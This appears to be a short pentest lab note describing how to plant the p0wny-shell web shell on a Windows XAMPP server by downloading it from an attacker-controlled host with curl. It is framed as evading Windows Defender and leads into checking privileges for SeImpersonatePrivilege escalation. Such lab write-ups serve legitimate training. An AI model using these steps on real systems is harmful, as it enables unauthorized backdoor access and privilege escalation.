Use the [p0wny-shell](https://github.com/flozz/p0wny-shell/tree/master)  to get a shell that passes Windows Defender.

This webshell provides more permissions than the ones you had obtained [[Vulnerable.ps1]].

## Create the [p0wny-shell] file

#Attacking_machine 
1. Download the  file from [github](https://github.com/flozz/p0wny-shell/tree/master) .

#netcat_listener 
2. Upload the file to `C:\xampp\htdocs\uploads\`.

```
curl "http://<ATTACKING MACHINE>/p0wny-shell.php" -OutFile "C:\xampp\htdocs\p0wny-shell.php"
```

#Attacking_machine 
3. Visit  `http://<MACHINE IP>:8080/p0wny-shell.php`.
	![[Screenshot_2025-10-31_07-23-03.png]]

## Discover privileges

You have a new webshell where you can discover user's privilege.

Type:
```
whoami /priv
```



![[Screenshot_2025-10-31_07-26-12-1.png]]

**Next step:** [[SeImpersonatePrivilege]]